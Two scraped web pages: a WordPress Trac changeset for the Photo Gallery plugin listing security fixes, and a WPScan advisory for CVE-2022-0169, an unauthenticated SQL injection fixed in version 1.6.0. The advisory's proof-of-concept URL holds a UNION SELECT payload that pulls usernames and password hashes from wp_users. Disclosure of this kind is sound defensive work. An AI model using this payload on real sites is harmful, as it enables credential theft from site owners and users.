=== Content from plugins.trac.wordpress.org_65922f36_20250115_102644.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F2672822%2Fphoto-gallery)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Change](/changeset/2665974/photo-gallery "Changeset 2665974 for photo-gallery")
* [Next Change](/changeset/2672881/photo-gallery "Changeset 2672881 for photo-gallery") →

---

# Changeset [2672822](/changeset/2672822 "Show full changeset") for [photo-gallery](/browser/photo-gallery?rev=2672822 "Show entry in browser")

Timestamp:
02/04/2022 10:38:14 AM
([3 years](/timeline?from=2022-02-04T10%3A38%3A14Z&precision=second "See timeline at 02/04/2022 10:38:14 AM") ago)

Author:
10web
Message:

Added: Slideshow filmstrip with fix count of thumbnails.

Improved: Russian translation.

Fixed: Security issue.

Fixed: XSS vulnerability reported by Nikita Podotykin of Positive Technologies.

Fixed: Zoom functionality.

Fixed: Filmstrip images load with enabled lazy load.

Fixed: Tags count on image delete.

Location:
[photo-gallery/trunk](/browser/photo-gallery/trunk?rev=2672822)
Files:

21 edited

* [admin/controllers/Shortcode.php](/browser/photo-gallery/trunk/admin/controllers/Shortcode.php?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/admin/controllers/Shortcode.php "Show differences"))
* [admin/models/Galleries.php](/browser/photo-gallery/trunk/admin/models/Galleries.php?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/admin/models/Galleries.php "Show differences"))
* [admin/models/Options.php](/browser/photo-gallery/trunk/admin/models/Options.php?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/admin/models/Options.php "Show differences"))
* [admin/views/Galleries.php](/browser/photo-gallery/trunk/admin/views/Galleries.php?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/admin/views/Galleries.php "Show differences"))
* [admin/views/Options.php](/browser/photo-gallery/trunk/admin/views/Options.php?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/admin/views/Options.php "Show differences"))
* [admin/views/Shortcode.php](/browser/photo-gallery/trunk/admin/views/Shortcode.php?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/admin/views/Shortcode.php "Show differences"))
* [css/bwg\_frontend.css](/browser/photo-gallery/trunk/css/bwg_frontend.css?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/css/bwg_frontend.css "Show differences"))
* [css/styles.min.css](/browser/photo-gallery/trunk/css/styles.min.css?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/css/styles.min.css "Show differences"))
* [framework/BWGOptions.php](/browser/photo-gallery/trunk/framework/BWGOptions.php?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/framework/BWGOptions.php "Show differences"))
* [framework/WDWLibrary.php](/browser/photo-gallery/trunk/framework/WDWLibrary.php?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/framework/WDWLibrary.php "Show differences"))
* [frontend/views/BWGViewGalleryBox.php](/browser/photo-gallery/trunk/frontend/views/BWGViewGalleryBox.php?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/frontend/views/BWGViewGalleryBox.php "Show differences"))
* [frontend/views/BWGViewSlideshow.php](/browser/photo-gallery/trunk/frontend/views/BWGViewSlideshow.php?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/frontend/views/BWGViewSlideshow.php "Show differences"))
* [js/bwg.js](/browser/photo-gallery/trunk/js/bwg.js?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/js/bwg.js "Show differences"))
* [js/bwg\_frontend.js](/browser/photo-gallery/trunk/js/bwg_frontend.js?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/js/bwg_frontend.js "Show differences"))
* [js/bwg\_gallery\_box.js](/browser/photo-gallery/trunk/js/bwg_gallery_box.js?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/js/bwg_gallery_box.js "Show differences"))
* [js/bwg\_shortcode.js](/browser/photo-gallery/trunk/js/bwg_shortcode.js?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/js/bwg_shortcode.js "Show differences"))
* [js/scripts.min.js](/browser/photo-gallery/trunk/js/scripts.min.js?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/js/scripts.min.js "Show differences"))
* [languages/bwg-ru\_RU.mo](/browser/photo-gallery/trunk/languages/bwg-ru_RU.mo?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/languages/bwg-ru_RU.mo "Show differences"))
* [languages/bwg-ru\_RU.po](/browser/photo-gallery/trunk/languages/bwg-ru_RU.po?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/languages/bwg-ru_RU.po "Show differences"))
* [photo-gallery.php](/browser/photo-gallery/trunk/photo-gallery.php?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/photo-gallery.php "Show differences"))
* [readme.txt](/browser/photo-gallery/trunk/readme.txt?rev=2672822 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/2672822/photo-gallery/trunk/readme.txt "Show differences"))

**Changeset view not shown**, since the total size (4.1 MB) exceeds
[4.0 MB](/wiki/TracIni#changeset-max_diff_bytes-option)

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2672822)
* [Zip Archive](?format=zip&new=2672822)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from wpscan.com_88cb45b8_20250115_102647.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Photo Gallery by 10Web < 1.6.0 - Unauthenticated SQL Injection

### Description

The plugin does not validate and escape the bwg\_tag\_id\_bwg\_thumbnails\_0 parameter before using it in a SQL statement via the bwg\_frontend\_data AJAX action (available to unauthenticated and authenticated users), leading to an unauthenticated SQL injection

### Proof of Concept

https://example.com/wp-admin/admin-ajax.php?action=bwg\_frontend\_data&shortcode\_id=1&bwg\_tag\_id\_bwg\_thumbnails\_0[]=)%22%20union%20select%201,2,3,4,5,6,7,concat(user\_login,%200x2c,%20user\_pass),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20from%20wp\_users%20--%20g

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

photo-gallery](https://a8cteam5105.wordpress.com/plugin/photo-gallery/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 1.6.0

### References

CVE
[CVE-2022-0169](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0169)

URL
<https://plugins.trac.wordpress.org/changeset/2672822/photo-gallery#file9>

### Classification

Type
SQLI

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-89](https://cwe.mitre.org/data/definitions/89.html)

CVSS
[8.6 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

### Miscellaneous

Original Researcher
Krzysztof Zając

Submitter
Krzysztof Zając

Submitter website
<https://kazet.cc/>

Verified
Yes

WPVDB ID
[0b4d870f-eab8-4544-91f8-9c5f0538709c](https://a8cteam5105.wordpress.com/vulnerability/0b4d870f-eab8-4544-91f8-9c5f0538709c/)

### Timeline

Publicly Published
2022-02-15 (about 2 years ago)

Added
2022-02-15 (about 2 years ago)

Last Updated
2022-04-08 (about 2 years ago)

### Other

Published
Title

Published
2024-12-17
Title
[WPLMS < 1.9.9.5.3 - Unauthenticated SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/e137361f-0c87-48d9-baa8-71e55e4be7ac/)

Published
2014-08-01
Title
[Duplicate Post 2.5 - duplicate-post-admin.php User Login Cookie Value SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/50f04757-f39b-4d34-b945-c5e8fd0c1afb/)

Published
2024-10-31
Title
[RSVP ME <= 1.9.9 - Authenticated (Contributor+) SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/253a481d-1733-4f31-8e75-b26859b81946/)

Published
2017-05-21
Title
[Surveys 1.01.8 - Authenticated SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/14f1b690-5e20-4d05-9ccc-55a543a2eb3e/)

Published
2021-08-06
Title
[Block and Stop Bad Bots < 6.60 - Authenticated SQL Injections](https://a8cteam5105.wordpress.com/vulnerability/ffa1f718-f2c5-48ef-8eea-33a18a628a2c/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

